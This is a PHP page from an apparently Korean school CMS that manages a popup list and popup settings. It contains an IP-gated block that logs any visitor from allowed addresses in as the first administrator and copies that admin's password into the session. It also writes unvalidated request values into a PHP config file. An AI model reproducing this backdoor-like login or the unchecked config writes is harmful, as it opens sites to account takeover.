<?php
/* vim: set expandtab tabstop=4 shiftwidth=4 foldmethod=marker: */
/**
* 작성일: 2009-08-11
* 작성자: 김종태
* 설   명: 팝업관리자 리스트
*****************************************************************
* 
*/
$DB = &WebApp::singleton("DB");

if(_OID == _AOID){


if(check_edumark_ip()) {
		
	

    $DB = &WebApp::singleton('DB');

	$sql = "SELECT 
		str_id,
		str_name,
		str_passwd, 
		str_email,

		chr_mtype,
		str_nick,
		num_fcode,
		num_auth,
		str_setup
		
		FROM TAB_MEMBER 
		
		WHERE 
		num_oid=$_OID AND 
		 chr_mtype = 'z' and ROWNUM = 1
		
		
		";


		if($data = $DB->sqlFetch($sql)){
	
		$_SESSION['ADMIN'] = true;
        $_SESSION['AUTH'] = true;
        $_SESSION['REMOTE_ADDR'] = getenv('REMOTE_ADDR');
        $_SESSION['MEM_TYPE'] = $mem_type;
        $_SESSION['USERID'] = $data['str_id'];
        $_SESSION['NAME'] = $data['str_name'];
		$_SESSION['NICKNAME'] = $data['str_nick'];
		$_SESSION['SETUP'] = $data['str_setup'];
		$_SESSION['PASSWORD'] = $data['str_passwd'];
		$_SESSION['E_MAIL'] = $data['str_email'];
        $_SESSION['CHR_MTYPE'] = $data['chr_mtype'];
        $USER_TYPE = $_SESSION['CHR_MTYPE'];
		}
		

	}


$DOC_TITLE="str:통합팝업관리";
	if(!$_SESSION[ADMIN]){
	WebApp::moveBack('권한이없습니다.');
	exit;
	}
}else{
$DOC_TITLE="str:팝업존";
}



switch ($REQUEST_METHOD) {
	case "GET":
	

		switch ($organdb[str_school]) {
			case "E":
			$psql = " and str_e = 'Y' ";
			 break;
			case "M":
			$psql = " and str_m = 'Y' ";
			break;
			case "H":
			$psql = " and str_h = 'Y' ";
			break;

			}


		$sql = "SELECT COUNT(*) FROM ".TAB_POPUP." WHERE num_oid = "._OID."   ";
		$total = $DB->sqlFetchOne($sql);
		if(!$total) $total = 0;

		if(!$listnum)$listnum = 15;

		$page = $_REQUEST['page'];
		if (!$page) $page = 1;

		$seek = $listnum * ($page - 1);
		$offset = $seek + $listnum;

		$sql = "
		select a.* from (
				 select ROWNUM as RNUM, b.* from (


		select * from TAB_POPUP where num_oid = "._OID."   order by num_serial desc

		)b)a
				where a.RNUM >=  $seek and a.RNUM <= $offset ";

		


		$row = $DB -> sqlFetchAll($sql);
		$tpl->assign(array('LIST'=>$row));


		if(_AOID != _OID){
		$sql = "select * from TAB_POPUP where num_oid = "._AOID." and  str_view = 'Y'  $psql ";
		$row2 = $DB -> sqlFetchAll($sql);
	

		$tpl->assign(array('LIST_g'=>$row2));
		}



		$tpl->setLayout('@sub');
		$tpl->define("CONTENT", Display::getTemplate("popup/zone.htm"));

		$tpl->assign(array(
		'title'=>$title,
		'page'=>$page,
		'total'=>$total,
		'listnum'=>$listnum,
		'mcode'=>$mcode,
		));





	

	 break;
	case "POST":

	
			$FTP = &WebApp::singleton('FtpClient',WebApp::getConf('account'));
           
			$INI = &WebApp::singleton("IniFile");
			$INI->load('hosts/'.HOST.'/conf/global.conf.php');
			$INI->setVar("popup_use",$popup_use,'popup');
			$INI->setVar("popup_kill",$popup_kill,'popup');
			$INI->setVar("skin_name",$skin_name,'popup');
			$FTP->put_string($INI->_combine(),_DOC_ROOT.'/hosts/'.HOST.'/conf/global.conf.php');
			
			WebApp::moveBack('적용되었습니다.');
			


	 break;
	}

?>